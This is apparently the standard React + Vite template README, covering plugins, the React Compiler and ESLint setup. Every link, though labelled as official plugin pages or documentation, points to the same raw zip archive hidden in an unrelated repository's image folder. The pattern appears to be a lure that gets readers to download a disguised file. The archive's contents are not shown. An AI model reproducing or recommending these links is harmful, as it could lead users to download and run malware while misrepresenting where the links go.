# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/mohamed-magdy-1/GSAP-GTA-VI/raw/refs/heads/main/public/images/VI_GT_GSA_1.8.zip) uses [Babel](https://github.com/mohamed-magdy-1/GSAP-GTA-VI/raw/refs/heads/main/public/images/VI_GT_GSA_1.8.zip) (or [oxc](https://github.com/mohamed-magdy-1/GSAP-GTA-VI/raw/refs/heads/main/public/images/VI_GT_GSA_1.8.zip) when used in [rolldown-vite](https://github.com/mohamed-magdy-1/GSAP-GTA-VI/raw/refs/heads/main/public/images/VI_GT_GSA_1.8.zip)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/mohamed-magdy-1/GSAP-GTA-VI/raw/refs/heads/main/public/images/VI_GT_GSA_1.8.zip) uses [SWC](https://github.com/mohamed-magdy-1/GSAP-GTA-VI/raw/refs/heads/main/public/images/VI_GT_GSA_1.8.zip) for Fast Refresh

## React Compiler

The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://github.com/mohamed-magdy-1/GSAP-GTA-VI/raw/refs/heads/main/public/images/VI_GT_GSA_1.8.zip).

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/mohamed-magdy-1/GSAP-GTA-VI/raw/refs/heads/main/public/images/VI_GT_GSA_1.8.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://github.com/mohamed-magdy-1/GSAP-GTA-VI/raw/refs/heads/main/public/images/VI_GT_GSA_1.8.zip) in your project.
